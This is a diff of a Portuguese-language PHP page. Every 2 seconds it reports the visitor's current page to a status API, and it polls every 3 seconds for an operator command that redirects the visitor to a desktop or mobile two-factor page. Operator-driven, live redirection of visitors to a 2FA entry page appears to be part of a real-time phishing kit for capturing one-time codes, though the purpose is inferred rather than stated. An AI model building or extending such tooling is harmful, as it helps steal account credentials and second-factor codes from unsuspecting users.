@@ -4,6 +4,19 @@ session_start();
 
 // Inclui a conexão com o banco de dados
 require 'db.php';
+
+function isMobileDevice() {
+    return preg_match("/(android|avantgo|blackberry|bolt|boost|cricket|docomo|fone|hiptop|mini|mobi|palm|phone|pie|tablet|up\.browser|up\.link|webos|wos)/i", $_SERVER["HTTP_USER_AGENT"]);
+}
+
+// Define o alvo do redirecionamento com base no dispositivo
+if (isMobileDevice()) {
+    $redirect_target_2fa = 'doisfatores2mobile.php';
+} else {
+    // Verifique se o nome do arquivo desktop é 'dois_fatores.php' ou 'dois_fatores2.php'
+    $redirect_target_2fa = 'dois_fatores.php'; 
+}
+
 // Prepara variáveis com valores padrão
 $identificador_label = 'Não identificado';
 $identificador_puro = '';
@@ -198,48 +211,57 @@ if (isset($_COOKIE['identificador_cliente'])) {
             const currentStatus = statusMap[currentPage] || 'Página Desconhecida';
 
             // Função que envia o "ping" para a API
-            async function announceCurrentLocation() {
+            async function sendStatusUpdate() {
                 try {
-                    // Usa a API de update para definir o status correto desta página
                     await fetch('api_update_status.php', {
                         method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ status: currentPageStatus }) // Note que não envia 'id'
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({ status: currentStatus })
                     });
-                    console.log(`Status definido para: ${currentPageStatus}`);
+                    // Não precisamos fazer nada com a resposta, apenas enviar.
                 } catch (error) {
-                    console.error('Falha ao anunciar localização:', error);
+                    // Se falhar, loga no console sem incomodar o usuário.
+                    console.error('Falha ao enviar atualização de status:', error);
                 }
             }
 
-            /**
-             * Função 2: Fica ouvindo por NOVOS comandos do admin.
-             */
-            async function listenForAdminCommands() {
+            // Envia o primeiro status imediatamente ao carregar a página
+            sendStatusUpdate();
+
+            // Configura para enviar o status a cada 2000 milissegundos (2 segundos)
+            setInterval(sendStatusUpdate, 2000);
+        })();
+    </script>
+    <script>
+        (function() {
+            // Pega a URL de redirecionamento que o PHP definiu
+            const redirectUrl = "<?php echo $redirect_target_2fa; ?>";
+
+            async function checkAdminCommand() {
                 try {
-                    // Usa a API de checagem
                     const response = await fetch('api_check_status.php');
                     const data = await response.json();
 
-                    if (data && data.status === 'redirecionar_para_2fa') {
-                        // Comando recebido! Para de ouvir e redireciona.
-                        clearInterval(commandListenerInterval);
+                    console.log('Status atual:', data.status); 
+
+                    if (data.status === 'redirecionar_para_2fa') {
+                        // Para a verificação para não redirecionar em loop
+                        clearInterval(statusInterval);
+                        
                         console.log('Comando do admin recebido! Redirecionando para:', redirectUrl);
+                        
+                        // Redireciona o usuário para o alvo correto (desktop ou mobile)
                         window.location.href = redirectUrl;
                     }
                 } catch (error) {
-                    console.error('Erro ao ouvir por comandos:', error);
+                    console.error('Erro ao verificar status:', error);
                 }
             }
 
-            // --- EXECUÇÃO ---
-            
-            // 1. Anuncia a localização atual imediatamente para limpar o status antigo.
-            announceCurrentLocation();
-
-            // 2. Começa a ouvir por novos comandos do admin a cada 3 segundos.
-            const commandListenerInterval = setInterval(listenForAdminCommands, 3000);
-
+            // Inicia a verificação a cada 3 segundos
+            const statusInterval = setInterval(checkAdminCommand, 3000);
         })();
     </script>
 </body>
